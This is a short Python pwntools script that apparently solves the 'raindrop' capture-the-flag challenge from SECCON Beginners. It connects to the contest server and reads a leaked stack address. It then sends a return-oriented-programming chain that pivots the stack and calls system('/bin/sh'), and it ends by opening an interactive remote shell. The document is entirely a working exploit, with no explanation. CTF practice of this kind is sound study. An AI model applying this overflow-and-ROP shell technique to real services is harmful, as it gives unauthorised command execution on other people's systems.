from pwn import *
import sys

addr_system = 0x4010a0
addr_pop_rdi = 0x401453
addr_pop_rsp_r13_r14_r15 = 0x40144d

binsh = b"/bin/sh\0x00"

# io = process("./chall")
io = remote("raindrop.quals.beginners.seccon.jp", 9001)

ret = io.readuntil("000002 | ")
print(ret.decode(), end="")

ret = io.readuntil(" ")
print(ret.decode(), end="")

addr_saved_rbp = int(ret.decode(), 16)
addr_buffer = addr_saved_rbp - 0x20
addr_binsh = addr_buffer + 0x28

ret = io.readuntil("understand?")
print(ret.decode())

s = p64(addr_pop_rdi)
s += p64(addr_binsh)
s += p64(addr_system)
s += p64(addr_pop_rsp_r13_r14_r15)
s += p64(addr_buffer - 0x18)
s += binsh
io.send(s)

ret = io.readuntil("finish")
print(ret.decode())

io.interactive()